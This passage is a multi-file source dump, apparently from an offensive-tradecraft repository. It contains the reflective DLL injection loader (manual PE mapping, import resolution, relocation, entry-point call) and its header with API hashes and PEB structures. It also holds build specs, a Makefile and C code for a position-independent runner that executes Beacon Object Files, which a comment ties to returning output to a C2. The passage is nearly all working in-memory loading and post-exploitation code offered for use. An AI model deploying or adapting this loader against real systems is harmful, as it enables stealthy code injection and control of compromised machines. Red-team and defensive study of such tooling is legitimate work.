		uiValueD = ((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData;

		while( uiValueD-- )
			*(BYTE *)uiValueB++ = *(BYTE *)uiValueC++;

		// get the VA of the next section
		uiValueA += sizeof( IMAGE_SECTION_HEADER );
	}

	// STEP 4: process our images import table...

	// uiValueB = the address of the import directory
	uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];
	
	// we assume their is an import table to process
	// uiValueC is the first entry in the import table
	uiValueC = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress );
	
	// itterate through all imports
	while( ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name )
	{
		// use LoadLibraryA to load the imported module into memory
		uiLibraryAddress = (ULONG_PTR)pLoadLibraryA( (LPCSTR)( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name ) );

		// uiValueD = VA of the OriginalFirstThunk
		uiValueD = ( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->OriginalFirstThunk );
	
		// uiValueA = VA of the IAT (via first thunk not origionalfirstthunk)
		uiValueA = ( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->FirstThunk );

		// itterate through all imported functions, importing by ordinal if no name present
		while( DEREF(uiValueA) )
		{
			// sanity check uiValueD as some compilers only import by FirstThunk
			if( uiValueD && ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal & IMAGE_ORDINAL_FLAG )
			{
				// get the VA of the modules NT Header
				uiExportDir = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

				// uiNameArray = the address of the modules export directory entry
				uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

				// get the VA of the export directory
				uiExportDir = ( uiLibraryAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );

				// get the VA for the array of addresses
				uiAddressArray = ( uiLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions );

				// use the import ordinal (- export ordinal base) as an index into the array of addresses
				uiAddressArray += ( ( IMAGE_ORDINAL( ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal ) - ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->Base ) * sizeof(DWORD) );

				// patch in the address for this imported function
				DEREF(uiValueA) = ( uiLibraryAddress + DEREF_32(uiAddressArray) );
			}
			else
			{
				// get the VA of this functions import by name struct
				uiValueB = ( uiBaseAddress + DEREF(uiValueA) );

				// use GetProcAddress and patch in the address for this imported function
				DEREF(uiValueA) = (ULONG_PTR)pGetProcAddress( (HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name );
			}
			// get the next imported function
			uiValueA += sizeof( ULONG_PTR );
			if( uiValueD )
				uiValueD += sizeof( ULONG_PTR );
		}

		// get the next import
		uiValueC += sizeof( IMAGE_IMPORT_DESCRIPTOR );
	}

	// STEP 5: process all of our images relocations...

	// calculate the base address delta and perform relocations (even if we load at desired image base)
	uiLibraryAddress = uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;

	// uiValueB = the address of the relocation directory
	uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];

	// check if their are any relocations present
	if( ((PIMAGE_DATA_DIRECTORY)uiValueB)->Size )
	{
		// uiValueC is now the first entry (IMAGE_BASE_RELOCATION)
		uiValueC = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress );

		// and we itterate through all entries...
		while( ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock )
		{
			// uiValueA = the VA for this relocation block
			uiValueA = ( uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)->VirtualAddress );

			// uiValueB = number of entries in this relocation block
			uiValueB = ( ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) ) / sizeof( IMAGE_RELOC );

			// uiValueD is now the first entry in the current relocation block
			uiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION);

			// we itterate through all the entries in the current block...
			while( uiValueB-- )
			{
				// perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
				// we dont use a switch statement to avoid the compiler building a jump table
				// which would not be very position independent!
				if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_DIR64 )
					*(ULONG_PTR *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += uiLibraryAddress;
				else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGHLOW )
					*(DWORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += (DWORD)uiLibraryAddress;
				else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGH )
					*(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += HIWORD(uiLibraryAddress);
				else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_LOW )
					*(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += LOWORD(uiLibraryAddress);

				// get the next entry in the current relocation block
				uiValueD += sizeof( IMAGE_RELOC );
			}

			// get the next entry in the relocation directory
			uiValueC = uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock;
		}
	}

	// STEP 6: call our images entry point

	// uiValueA = the VA of our newly loaded DLL/EXE's entry point
	uiValueA = ( uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint );

	// We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
	pNtFlushInstructionCache( (HANDLE)-1, NULL, 0 );

	// call our respective entry point, fudging our hInstance value

	// if we are injecting an DLL via a stub we call DllMain with no parameter
	((DLLMAIN)uiValueA)( (HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, NULL );

	// STEP 8: return our new entry point address so whatever called us can call DllMain() if needed.
	return uiValueA;
}

// from: https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif

char __DLLDATA__[0] __attribute__((section("my_dll")));

#ifdef WIN_X86
__declspec(noinline) ULONG_PTR caller( VOID ) { return (ULONG_PTR)WIN_GET_CALLER(); }
#endif

char * findAppendedDLL() {
	return (char *)&__DLLDATA__;
}

```

## File: rdllinjection/src/ReflectiveLoader.h

```h
//===============================================================================================//
// Copyright (c) 2012, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
// All rights reserved.
// 
// Redistribution and use in source and binary forms, with or without modification, are permitted 
// provided that the following conditions are met:
// 
//     * Redistributions of source code must retain the above copyright notice, this list of 
// conditions and the following disclaimer.
// 
//     * Redistributions in binary form must reproduce the above copyright notice, this list of 
// conditions and the following disclaimer in the documentation and/or other materials provided 
// with the distribution.
// 
//     * Neither the name of Harmony Security nor the names of its contributors may be used to
// endorse or promote products derived from this software without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
// POSSIBILITY OF SUCH DAMAGE.
//===============================================================================================//
#ifndef _REFLECTIVEDLLINJECTION_REFLECTIVELOADER_H
#define _REFLECTIVEDLLINJECTION_REFLECTIVELOADER_H
//===============================================================================================//
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <intrin.h>

#include "ReflectiveDLLInjection.h"

typedef HMODULE (WINAPI * LOADLIBRARYA)( LPCSTR );
typedef FARPROC (WINAPI * GETPROCADDRESS)( HMODULE, LPCSTR );
typedef LPVOID  (WINAPI * VIRTUALALLOC)( LPVOID, SIZE_T, DWORD, DWORD );
typedef DWORD  (NTAPI * NTFLUSHINSTRUCTIONCACHE)( HANDLE, PVOID, ULONG );

#define KERNEL32DLL_HASH				0x6A4ABC5B
#define NTDLLDLL_HASH					0x3CFA685D

#define LOADLIBRARYA_HASH				0xEC0E4E8E
#define GETPROCADDRESS_HASH				0x7C0DFCAA
#define VIRTUALALLOC_HASH				0x91AFCA54
#define NTFLUSHINSTRUCTIONCACHE_HASH	0x534C0AB8

#define IMAGE_REL_BASED_ARM_MOV32A		5
#define IMAGE_REL_BASED_ARM_MOV32T		7

#define ARM_MOV_MASK					(DWORD)(0xFBF08000)
#define ARM_MOV_MASK2					(DWORD)(0xFBF08F00)
#define ARM_MOVW						0xF2400000
#define ARM_MOVT						0xF2C00000

#define HASH_KEY						13
//===============================================================================================//
#pragma intrinsic( _rotr )

__forceinline DWORD ror( DWORD d )
{
	return _rotr( d, HASH_KEY );
}

__forceinline DWORD hash( char * c )
{
    register DWORD h = 0;
	do
	{
		h = ror( h );
        h += *c;
	} while( *++c );

    return h;
}
//===============================================================================================//
typedef struct _UNICODE_STR
{
  USHORT Length;
  USHORT MaximumLength;
  PWSTR pBuffer;
} UNICODE_STR, *PUNICODE_STR;

// WinDbg> dt -v ntdll!_LDR_DATA_TABLE_ENTRY
//__declspec( align(8) ) 
typedef struct _LDR_DATA_TABLE_ENTRY
{
	//LIST_ENTRY InLoadOrderLinks; // As we search from PPEB_LDR_DATA->InMemoryOrderModuleList we dont use the first entry.
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STR FullDllName;
	UNICODE_STR BaseDllName;
	ULONG Flags;
	SHORT LoadCount;
	SHORT TlsIndex;
	LIST_ENTRY HashTableEntry;
	ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

// WinDbg> dt -v ntdll!_PEB_LDR_DATA
typedef struct _PEB_LDR_DATA //, 7 elements, 0x28 bytes
{
   DWORD dwLength;
   DWORD dwInitialized;
   LPVOID lpSsHandle;
   LIST_ENTRY InLoadOrderModuleList;
   LIST_ENTRY InMemoryOrderModuleList;
   LIST_ENTRY InInitializationOrderModuleList;
   LPVOID lpEntryInProgress;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

// WinDbg> dt -v ntdll!_PEB_FREE_BLOCK
typedef struct _PEB_FREE_BLOCK // 2 elements, 0x8 bytes
{
   struct _PEB_FREE_BLOCK * pNext;
   DWORD dwSize;
} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;

// struct _PEB is defined in Winternl.h but it is incomplete
// WinDbg> dt -v ntdll!_PEB
typedef struct __PEB // 65 elements, 0x210 bytes
{
   BYTE bInheritedAddressSpace;
   BYTE bReadImageFileExecOptions;
   BYTE bBeingDebugged;
   BYTE bSpareBool;
   LPVOID lpMutant;
   LPVOID lpImageBaseAddress;
   PPEB_LDR_DATA pLdr;
   LPVOID lpProcessParameters;
   LPVOID lpSubSystemData;
   LPVOID lpProcessHeap;
   PRTL_CRITICAL_SECTION pFastPebLock;
   LPVOID lpFastPebLockRoutine;
   LPVOID lpFastPebUnlockRoutine;
   DWORD dwEnvironmentUpdateCount;
   LPVOID lpKernelCallbackTable;
   DWORD dwSystemReserved;
   DWORD dwAtlThunkSListPtr32;
   PPEB_FREE_BLOCK pFreeList;
   DWORD dwTlsExpansionCounter;
   LPVOID lpTlsBitmap;
   DWORD dwTlsBitmapBits[2];
   LPVOID lpReadOnlySharedMemoryBase;
   LPVOID lpReadOnlySharedMemoryHeap;
   LPVOID lpReadOnlyStaticServerData;
   LPVOID lpAnsiCodePageData;
   LPVOID lpOemCodePageData;
   LPVOID lpUnicodeCaseTableData;
   DWORD dwNumberOfProcessors;
   DWORD dwNtGlobalFlag;
   LARGE_INTEGER liCriticalSectionTimeout;
   DWORD dwHeapSegmentReserve;
   DWORD dwHeapSegmentCommit;
   DWORD dwHeapDeCommitTotalFreeThreshold;
   DWORD dwHeapDeCommitFreeBlockThreshold;
   DWORD dwNumberOfHeaps;
   DWORD dwMaximumNumberOfHeaps;
   LPVOID lpProcessHeaps;
   LPVOID lpGdiSharedHandleTable;
   LPVOID lpProcessStarterHelper;
   DWORD dwGdiDCAttributeList;
   LPVOID lpLoaderLock;
   DWORD dwOSMajorVersion;
   DWORD dwOSMinorVersion;
   WORD wOSBuildNumber;
   WORD wOSCSDVersion;
   DWORD dwOSPlatformId;
   DWORD dwImageSubsystem;
   DWORD dwImageSubsystemMajorVersion;
   DWORD dwImageSubsystemMinorVersion;
   DWORD dwImageProcessAffinityMask;
   DWORD dwGdiHandleBuffer[34];
   LPVOID lpPostProcessInitRoutine;
   LPVOID lpTlsExpansionBitmap;
   DWORD dwTlsExpansionBitmapBits[32];
   DWORD dwSessionId;
   ULARGE_INTEGER liAppCompatFlags;
   ULARGE_INTEGER liAppCompatFlagsUser;
   LPVOID lppShimData;
   LPVOID lpAppCompatInfo;
   UNICODE_STR usCSDVersion;
   LPVOID lpActivationContextData;
   LPVOID lpProcessAssemblyStorageMap;
   LPVOID lpSystemDefaultActivationContextData;
   LPVOID lpSystemAssemblyStorageMap;
   DWORD dwMinimumStackCommit;
} _PEB, * _PPEB;

typedef struct
{
	WORD	offset:12;
	WORD	type:4;
} IMAGE_RELOC, *PIMAGE_RELOC;
//===============================================================================================//
#endif
//===============================================================================================//

```

## File: simple_bof/bofprep.spec

```text
#
# prepare a PICO for execution as a BOF
#

x86:
	# set the entrypoint of this PICO to the first argument passed to this file
	entry %1

	# merge in the Beacon API implementation
	load "bin/bofapi.x86.o"
		merge

	#
	# attach our merged in API to any Beacon API imports
	#
	attach "$BeaconDataExtract"    "_BeaconDataExtract"
	attach "$BeaconDataLength"     "_BeaconDataLength"
	attach "$BeaconDataParse"      "_BeaconDataParse"
	attach "$BeaconDataPtr"        "_BeaconDataPtr"
	attach "$BeaconDataInt"        "_BeaconDataInt"
	attach "$BeaconDataShort"      "_BeaconDataShort"

	attach "$BeaconFormatAlloc"    "_BeaconFormatAlloc"
	attach "$BeaconFormatReset"    "_BeaconFormatReset"
	attach "$BeaconFormatAppend"   "_BeaconFormatAppend"
	attach "$BeaconFormatPrintf"   "_BeaconFormatPrintf"
	attach "$BeaconFormatToString" "_BeaconFormatToString"
	attach "$BeaconFormatFree"     "_BeaconFormatFree"
	attach "$BeaconFormatInt"      "_BeaconFormatInt"
	attach "$BeaconPrintf"         "_BeaconPrintf"

x64:
	entry %1

	load "bin/bofapi.x64.o"
		merge

	attach "$BeaconDataExtract"    "BeaconDataExtract"
	attach "$BeaconDataLength"     "BeaconDataLength"
	attach "$BeaconDataParse"      "BeaconDataParse"
	attach "$BeaconDataPtr"        "BeaconDataPtr"
	attach "$BeaconDataInt"        "BeaconDataInt"
	attach "$BeaconDataShort"      "BeaconDataShort"

	attach "$BeaconFormatAlloc"    "BeaconFormatAlloc"
	attach "$BeaconFormatReset"    "BeaconFormatReset"
	attach "$BeaconFormatAppend"   "BeaconFormatAppend"
	attach "$BeaconFormatPrintf"   "BeaconFormatPrintf"
	attach "$BeaconFormatToString" "BeaconFormatToString"
	attach "$BeaconFormatFree"     "BeaconFormatFree"
	attach "$BeaconFormatInt"      "BeaconFormatInt"
	attach "$BeaconPrintf"         "BeaconPrintf"

```

## File: simple_bof/LICENSE.txt

```text
Copyright 2025-2026 Adversary Fan Fiction Writers Guild

Redistribution and use in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of
conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of
conditions and the following disclaimer in the documentation and/or other materials provided
with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written
permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
All rights reserved.
 
Redistribution and use in source and binary forms, with or without modification, are permitted 
provided that the following conditions are met:
 
    * Redistributions of source code must retain the above copyright notice, this list of 
conditions and the following disclaimer.
 
    * Redistributions in binary form must reproduce the above copyright notice, this list of 
conditions and the following disclaimer in the documentation and/or other materials provided 
with the distribution.
 
    * Neither the name of Harmony Security nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written permission.
 
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
POSSIBILITY OF SUCH DAMAGE.

```

## File: simple_bof/loader.spec

```text
#
# Simple BOF Runner
#

x86:
	# load our BOF runner content on the program stack
	load "bin/loader.x86.o"
		# make this into position-independent code with _go() at the top, remove unused functions
		make pic +gofirst +optimize

		# bring in a services module to merge and configure helper functions for this PIC		
		run "../simple_pic/services.spec"

		# merge the Tradecraft Garden Library into our PIC
		mergelib "../libtcg/libtcg.x86.zip"

		# dump our BOF contents onto the stack
		push $OBJECT
			# turn this COFF into a PICO, remove unused functions
			make object +optimize

			# prepare this BOF for execution as a PICO (e.g., merge in the API)
			# %1 = the entry point of the BOF
			run "bofprep.spec" "_go"

			# We're responsible to provide BeaconPutput to the BOF (somehow). BeaconOutput is the
			# function to pass data back to a C2, output to a console, or in this case DebugView.
			# Here, we use import to provide it via the IMPORTFUNCS struct passed to PicoLoad.
		        import "LoadLibraryA, GetProcAddress, BeaconOutput"

			# export our ready-to-run PICO and link to my_data section
			export
			link "my_data"

	# we're done, export the final blob
	export

x64:
	load "bin/loader.x64.o"
		make pic +gofirst +optimize

		run "../simple_pic/services.spec"
		mergelib "../libtcg/libtcg.x64.zip"

		push $OBJECT
			make object +optimize

			run "bofprep.spec" "go"
		        import "LoadLibraryA, GetProcAddress, BeaconOutput"

			export
			link "my_data"

		export

```

## File: simple_bof/Makefile

```text
CC=i686-w64-mingw32-gcc
CC_64=x86_64-w64-mingw32-gcc
CFLAGS=-O1 -fno-jump-tables -shared -Wall -Wno-pointer-arith

.PHONY: all x86 x64 clean

all: x86 x64

bin:
	mkdir -p bin

x86: bin
	$(CC) -DWIN_X86 $(CFLAGS) -c src/loader.c -o bin/loader.x86.o
	$(CC) -DWIN_X86 $(CFLAGS) -c src/bofapi.c -o bin/bofapi.x86.o

x64: bin
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/loader.c -o bin/loader.x64.o
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/bofapi.c -o bin/bofapi.x64.o

clean:
	rm -rf bin

```

## File: simple_bof/src/bofapi.c

```c
/*
 * Copyright 2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
#include <windows.h>

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualFree (LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
WINBASEAPI int __cdecl MSVCRT$vsnprintf(char * __restrict__ d,size_t n,const char * __restrict__ format,va_list arg);

#define memset(x, y, z) __stosb((unsigned char *)x, y, z);
#define memcpy(x, y, z) __movsb((unsigned char *)x, (unsigned char *)y, z);

/* format API */
typedef struct {
	char * original; /* the original buffer [so we can free it] */
	char * buffer;   /* current pointer into our buffer */
	int    length;   /* remaining length of data */
	int    size;     /* total size of this buffer */
} formatp, datap;

int    BeaconDataInt(datap * parser);
short  BeaconDataShort(datap * parser);
char * BeaconDataExtract(datap * parser, int * size);
int    BeaconDataLength(datap * parser);
void   BeaconDataParse(datap * parser, char * buffer, int size);
char * BeaconDataPtr(datap * parser, int size);

void   BeaconFormatAlloc(formatp * format, int maxsz);
void   BeaconFormatReset(formatp * format);
void   BeaconFormatAppend(formatp * format, char * text, int len);
void   BeaconFormatPrintf(formatp * format, char * fmt, ...);
char * BeaconFormatToString(formatp * format, int * size);
void   BeaconFormatFree(formatp * format);
void   BeaconFormatInt(formatp * format, int value);

void   BeaconPrintf(int type, char * format, ...);

char * BofApiAlloc(SIZE_T sz);
void   BofApiFree(char * ptr);

/* Our BOF runner needs to implement this and link it to our BOF */
DECLSPEC_IMPORT void BeaconOutput(int type, char * data, int len);

int BeaconDataLength(datap * parser) {
	return parser->length;
}

int BeaconDataInt(datap * parser) {
	int * foo = (int *)BeaconDataPtr(parser, sizeof(int));

	if (foo == NULL)
		return 0;

	return *foo;
}

short BeaconDataShort(datap * parser) {
	short * foo = (short *)BeaconDataPtr(parser, sizeof(short));

	if (foo == NULL)
		return 0;

	return *foo;
}

char * BeaconDataExtract(datap * parser, int * size) {
	int    len = BeaconDataInt(parser);
	char * res = BeaconDataPtr(parser, len);

	if (size != NULL)
		*size = (res == NULL) ? 0 : len;

	return res;
}

void BeaconDataParse(datap * parser, char * buffer, int size) {
	parser->original = buffer;
	parser->buffer   = buffer;
	parser->length   = size;
	parser->size     = size;
}

char * BeaconDataPtr(datap * parser, int size) {
	char * temp = parser->buffer;

	/* don't give out any more pointers if something goes wrong */
	if (size < 0 || size > parser->length) {
		parser->length = 0;
		return NULL;
	}

	parser->buffer += size;
	parser->length -= size;
	return temp;
}

void BeaconFormatAlloc(formatp * format, int maxsz) {
	format->original = BofApiAlloc(maxsz);
	format->buffer   = format->original;
	format->length   = 0;
	format->size     = maxsz;
}

void BeaconFormatReset(formatp * format) {
	format->buffer = format->original;
	format->length = 0;
	memset(format->original, 0, format->size);
}

void BeaconFormatAppend(formatp * format, char * text, int len) {
	if (format->length >= format->size)
		return;

	/* we're going to truncate if there's not enough space */
	int remaining = format->size - format->length;
	int writelen  = (remaining < len) ? remaining : len;

	memcpy(format->buffer, text, writelen);
	format->length += writelen;
	format->buffer += writelen;
}

void BeaconFormatPrintf(formatp * format, char * fmt, ...) {
	int    len;
	char * temp;

	va_list args;

	/* figure out the length of our buffer */
	va_start(args, fmt);
	len  = MSVCRT$vsnprintf(NULL, 0, fmt, args);
	va_end(args);

	if (len < 0)
		return;

	/* allocate our memory */
	temp = BofApiAlloc(len + 1);
	if (temp == NULL)
		return;

	/* format everything */
	va_start(args, fmt);
	MSVCRT$vsnprintf(temp, len + 1, fmt, args);
	va_end(args);

	/* print it */
	BeaconFormatAppend(format, temp, len);

	/* free our memory and move on with our lives */
	BofApiFree(temp);
}

char * BeaconFormatToString(formatp * format, int * size) {
	if (size != NULL)
		*size = format->length;

	return format->original;
}

void BeaconFormatFree(formatp * format) {
	BofApiFree(format->original);

	format->buffer   = NULL;
	format->original = NULL;
	format->length   = 0;
	format->size     = 0;
}

void BeaconFormatInt(formatp * format, int value) {
	BeaconFormatAppend(format, (char *)&value, sizeof(int));
}

void BeaconPrintf(int type, char * format, ...) {
	int    len;
	char * temp;

	va_list args;

	/* figure out the length of our buffer */
	va_start(args, format);
	len  = MSVCRT$vsnprintf(NULL, 0, format, args);
	va_end(args);

	if (len < 0)
		return;

	/* allocate our memory */
	temp = BofApiAlloc(len + 1);

	if (temp == NULL)
		return;

	/* format everything */
	va_start(args, format);
	MSVCRT$vsnprintf(temp, len + 1, format, args);
	va_end(args);

	/* print it */
	BeaconOutput(type, temp, len);

	/* free our memory and move on with our lives */
	BofApiFree(temp);
}

/* This is a potential redirect target if you want to change how this API allocates RW memory */
char * BofApiAlloc(SIZE_T sz) {
	return KERNEL32$VirtualAlloc(NULL, sz, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
}

/* Same, a potential redirect target to change how this API frees RW memory */
void BofApiFree(char * ptr) {
	KERNEL32$VirtualFree(ptr, 0, MEM_RELEASE);
}

```

## File: simple_bof/src/loader.c

```c
/*
 * Copyright 2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
